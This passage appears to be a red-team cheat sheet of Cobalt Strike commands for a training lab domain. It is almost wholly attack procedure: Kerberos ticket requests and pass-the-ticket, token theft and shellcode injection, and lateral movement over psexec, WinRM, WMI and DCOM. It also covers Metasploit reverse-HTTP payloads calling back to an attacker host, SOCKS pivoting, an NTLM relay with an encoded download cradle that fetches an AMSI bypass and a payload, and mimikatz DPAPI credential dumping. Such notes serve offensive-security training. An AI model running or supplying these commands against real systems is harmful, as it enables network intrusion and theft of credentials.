# Using rc4 NTLM Hash
beacon> execute-assembly Rubeus.exe asktgt /user:jking /ntlm:<ntlm> /nowrap

# Using aes256 hash for better opsec, along with /domain (Use NetBios name "DEV" not FQDN "dev.cyberbotic.io") and /opsec flags (better opsec)
beacon> execute-assembly Rubeus.exe asktgt /user:jking /aes256:<aes256> /domain:DEV /opsec /nowrap

# Using username and password to obtain TGT
# We can use Rubeus to calculate hash from the credentials
# Calculate Hash of the random password, So we can use it to get TGT.
cmd> Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
# Alternatively we can use make_token in Cobalt Strike
beacon> execute-assembly Rubeus.exe asktgt /user:jking /password:<password> /enctype:<des|aes128|aes256|rc4(default)> /domain:DEV /opsec /nowrap
beacon> execute-assembly Rubeus.exe asktgt /user:mssql_svc /password:Cyberb0tic /enctype:rc4 /domain:DEV /nowrap
beacon> execute-assembly Rubeus.exe asktgt /user:EvilComputer$ /aes256:<aes256> /nowrap

# Now using this TGT perform PTT attack
beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj...lDLklP

beacon> steal_token 4748
beacon> token-store steal 4748

# Now we can check for LocalAdminAccess and then Move Laterally.
beacon> powershell-import PowerView.ps1
beacon> powerpick Find-LocalAdminAccess -Verbose
```

##### Token Impersonation , Token Store, Make Token & Process Injection

```powershell
# steal access token from another process using steal_token
beacon> steal_token <PID>

# Drop the impersonation
beacon> rev2self

# Storing and managing stolen access tokens using token-store
# Steal token from a process
beacon> token-store steal <PID>
# List all stored tokens
beacon> token-store show
# Impersonating a Stored Token
beacon> token-store use <id>
# Drop the impersonation
beacon> rev2self
# Removing a Single Token or Flushing all tokens
beacon> token-store remove <id>
beacon> token-store remove-all

# Impersonating Domain User with Credentials using make_token (make_token = runas /netonly)
# The logon session created with LogonUserA API (make_token) has the same local identifier as the caller but the alternate credentials are used when accessing a remote resource.
beacon> make_token DEV\jking <password>

# Process Injection
# `shinject` allows you to inject any arbitrary shellcode from a binary file on your attacking machine
beacon> shinject <PID> <x86|x64> /path/to/binary.bin
# `inject` will inject a full Beacon payload for the specified listener.
beacon> inject <PID> x64 tcp-4444-local

# SpawnAs
beacon> spawnas DEV\jking <password> tcp-4444-local
```

### Lateral Movement

```powershell
# using jump
# This will spawn a Beacon payload on the remote target, and if using a P2P listener, will connect to it automatically.
# To make the jump command work and include amsi bypass into it, We need to modify the Resource kit's template.x86.ps1 (for winrm), template.x64.ps1 (for winrm64) and compress.ps1 (for psexec_psh).
beacon> jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener

# Using remote-exec
# You also need to connect to P2P Beacons manually using connect or link.
beacon> remote-exec psexec/winrm/wmi ComputerName <uploaded binary on remote system>
# To execute commands
beacon> remote-exec winrm ComputerName <execute commands>

#--------------------------------------------------------------

# Using PSExec (Requires TGS for CIFS)
beacon> ak-settings
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswrun klist ow64\dllhost.exe

beacon> jump psexec64 web.dev.cyberbotic.io smb
beacon> jump psexec_psh web.dev.cyberbotic.io smb

beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec psexec web.dev.cyberbotic.io C:\Windows\smb_x64.exe
beacon> remote-exec psexec sql-2 powershell.exe -nop -w hidden -c 'C:\Windows\smb_x64.exe'
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
# Then use powerpick to get its own process name, it will return dllhost.
beacon> powerpick Get-Process -Id $pid | select ProcessName

#-------------------------------------------------------------------------------------

# Example Windows Remote Management (WinRM) - (Requires TGS for HOST & HTTP)
beacon> ls \\web.dev.cyberbotic.io\c$
beacon> jump winrm64 web.dev.cyberbotic.io smb
beacon> jump winrm web.dev.cyberbotic.io smb

beacon> cd \\web.dev.cyberbotic.io\c$\ProgramData
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec winrm web.dev.cyberbotic.io C:\Windows\smb_x64.exe
beacon> remote-exec winrm sql-2 powershell.exe -nop -w hidden -c 'C:\Windows\smb_x64.exe'
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff1

#-------------------------------------------------------------------------------------

# Example Windows Management Instrumentation (WMI) - (Requires TGS for HOST & RPCSS)
# If gets COM Error try to upload the binary to directory where user may have access
beacon> cd \\web.dev.cyberbotic.io\c$\ProgramData
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
beacon> remote-exec wmi sql-2 powershell.exe -nop -w hidden -c 'C:\Windows\smb_x64.exe'
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10

# Using SharpWMI
beacon> execute-assembly SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_beacon2.exe"
beacon> link WINTERFELL msagent_eb

#-------------------------------------------------------------------------------------

# Executing .Net binary remotely
## Some of Seatbelt's commands can also be run remotely, which can be useful enumerating its configurations and defences before jumping to it.
beacon> execute-assembly Seatbelt.exe OSInfo -ComputerName=web

#--------------------------------------------------------------------------------------

# Invoke DCOM (better opsec) (Requires TGS for RPCSS)
beacon> powershell-import Invoke-DCOM.ps1
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload c:\Payloads\smb_x64.exe
beacon> powerpick Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
beacon> link web.dev.cyberbotic.io agent_vinod
```

### Session Passing

```powershell
# CASE 1: Beacon Passing (Within Cobalt Strike - Create alternate HTTP beacon while keeping DNS as lifeline)
beacon> spawn x64 http

# CASE 2: Foreign Listener (From CS to Metasploit - Staged Payload - only x86 payloads)
# Setup Metasploit listener
attacker@ubuntu ~> sudo msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST ens5
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
# Setup a Foreign Listener in cobalt strike with above IP & port details
# Use Jump psexec to execute the beacon payload and pass the session
beacon> jump psexec Foreign_listener
beacon> spawn x86 Foreign_listener

# CASE 3: Shellcode Injection (From CS to Metasploit - Stageless Payload)
# Setup up metasploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_http
msf6 exploit(multi/handler) > exploit
# Generate binary
ubuntu@DESKTOP-3BSK7NO ~> msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin
# Inject msf shellcode into process memory
beacon> shspawn x64 C:\Payloads\msf_http_x64.bin
```

### Pivoting

```powershell
# Enable Socks Proxy in beacon session (Use SOCKS 5 for better OPSEC)
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging
beacon> socks 1080 socks4
beacon> socks stop
# Verify the SOCKS proxy on team server
attacker@ubuntu ~> sudo ss -lpnt

# Configure Proxychains in Linux
$ sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password
$attacker@ubuntu ~> proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
$attacker@ubuntu ~ > proxychains wmiexec.py DEV/jking@10.10.122.30

# Tunnel Metasploit Framework exploits and modules through Beacon.
beacon> socks 6666 socks4
msf> setg Proxies socks4:TeamServerIP:Port
msf> setg ReverseAllowProxy true
msf> unsetg Proxies

# Use Proxifier for Windows environment 
ps> runas /netonly /user:dev/bfarmer mmc.exe
ps> mimikatz > privilege::debug
ps> mimikatz > sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
PS C:\Users\Attacker> $cred = Get-Credential
PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select

# Use FoxyProxy plugin to access Webportal via SOCKS Proxy

# Reverse Port Forward (if teamserver is not directly accessible, then use rportfwd to redirect traffic)
beacon> rportfwd 8080 127.0.0.1 80
beacon> rportfwd stop 8080

beacon> run netstat -anp tcp
beacon> powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
ps> iwr -Uri http://wkstn-2:8080/a
beacon> powershell Remove-NetFirewallRule -DisplayName "Test Rule"

# -------------------------------------------------------------------------------
# NTLM Relay

# 1. Allow ports inbound on the Windows firewall (One for SMB and one for Powershell cradle).
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# 2. Setup reverse port forwarding - one for the SMB capture, the other for a PowerShell download cradle.
beacon> rportfwd 8080 127.0.0.1 80
beacon> rportfwd 8445 127.0.0.1 445

# 3. Setup SOCKS Proxy on the beacon
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

# 4. Setup Proxychains to use this proxy
$ sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

# 5. Use Proxychain to send NTLMRelay traffic to beacon targeting DC and encoded SMB Payload for execution
$ sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc SQBFAFg...AA=='
# encoded command = IEX (new-object net.webclient).downloadstring("http://wkstn-2:8080/amsi-bypass.ps1");iex (new-object net.webclient).downloadstring("http://wkstn-2:8080/b")
# wkstn-2 IP. is the IP address of dc-2.dev.cyberbotic.io, which is our target.
# The encoded command is a download cradle pointing at http://10.10.123.102:8080/b, and /b is an SMB payload.

# 6. Upload PortBender driver and load its .cna file (Cobalt Strike > Script Manager and load PortBender.cna)
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445

# 7. Manually try to access share on our system or use MSPRN, Printspooler to force authentication (Refer to Notes)
# Manually triggering the attack (Usin a console of Wkstn-1 as nlamb user to make authentication attempt on wkstn-2.)
C:\Users\nlamb>hostname
wkstn-1
C:\Users\nlamb>dir \\10.10.123.102\relayme
C:\Users\nlamb>dir \\wkstn-2\relayme
# 8. Verify the access in weblog and use link command to connect with SMB beacon
beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```

### Data Protection API (DPAPI)

```powershell
# Use mimikatz to dump secrets from windows vault
beacon> mimikatz !vault::list
beacon> mimikatz !vault::cred /patch

# Part 1: Enumerate stored credentials, Make sure to enumerate as both Admin and Domain User in a machine.
# 0. Check if system has credentials stored in either web or windows vault
beacon> run vaultcmd /list
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
beacon> run vaultcmd /listcreds:"Web Credentials" /all
beacon> execute-assembly Seatbelt.exe WindowsVault

# Part 2.1: Scheduled Task Credentials
# 0. Before manually trying to extract Credentials try below command ones which is equivalent of the below commands and gives same.
beacon> mimikatz !vault::cred /patch
# 1. Credentials for task scheduler are stored at below location in encrypted blob
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
# 2. Find the GUID (guidMasterKey) of Master key associated with encrypted blob (F31...B6E)
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F31...B6E
# 3. Dump all the master keys and filter the one we need based on GUID identified in previous step
beacon> mimikatz !sekurlsa::dpapi
# 4. Use the Encrypted Blob and Master Key to decrypt and extract plain text password
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F31...B6E /masterkey:10530d...593a541f8d0d9

# Part 2.2: Extracting stored RDP Password

# 0. Verify if any credentials are stored or not
beacon> run vaultcmd /list
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
beacon> run vaultcmd /listcreds:"Web Credentials" /all
beacon> execute-assembly Seatbelt.exe WindowsVault

# 1. Enumerate the location of encrypted credentials blob (Returns ID of Enc blob and GUID of Master Key)
beacon> execute-assembly Seatbelt.exe WindowsCredentialFiles

# 2. Verify the credential blob in users cred directory (Note encrypted blob ID)
beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

# 3. Master keys are stored in the users' roaming "Protect" directory (Note GUID of master key matching with Seatbelt)
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104

# 4. Decrypt the master key first to obtain the actual AES128/256 encryption key, and then use that key to decrypt the credential blob. (Need to be execute in context of user who owns the key, use @ modifier)
# Requires Elevation or interaction with LSASS
beacon> mimikatz !sekurlsa::dpapi
# Does not requires elevation or interaction with LSASS (Check last lines with "domainkey with RPC" line)
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

# 5. Use Master key to decrypt the credentials blob
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395...fa4371f19c214
```
